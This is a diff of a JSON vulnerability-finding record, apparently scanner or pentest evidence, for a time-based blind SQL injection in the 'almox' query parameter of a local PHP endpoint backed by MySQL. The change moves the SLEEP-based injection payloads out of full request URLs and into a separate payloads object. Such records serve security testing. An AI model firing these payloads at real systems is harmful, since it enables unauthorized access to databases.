@@ -11,21 +11,21 @@
     "required": false
   },
   "evidence": {
-    "requests": {
-      "control": {
-        "method": "GET",
-        "url": "http://127.0.0.1:8989/controle/getProdutosPorAlmox.php?almox=1"
+    "base_request": {
+      "method": "GET",
+      "url": "http://127.0.0.1:8989/controle/getProdutosPorAlmox.php?almox=1"
+    },
+    "injection": {
+      "location": {
+        "kind": "query",
+        "name": "almox"
       },
-      "delay_low": {
-        "method": "GET",
-        "url": "http://127.0.0.1:8989/controle/getProdutosPorAlmox.php?almox=0%20OR%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%280%29%29x%29"
-      },
-      "delay_high": {
-        "method": "GET",
-        "url": "http://127.0.0.1:8989/controle/getProdutosPorAlmox.php?almox=0%20OR%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29x%29"
+      "payloads": {
+        "control": "1",
+        "delay_low": "0 OR (SELECT 1 FROM (SELECT SLEEP(0))x)",
+        "delay_high": "0 OR (SELECT 1 FROM (SELECT SLEEP(5))x)"
       }
     },
-    "vulnerable_parameter": "almox",
     "dbms_hint": "mysql"
   },
   "proof": {
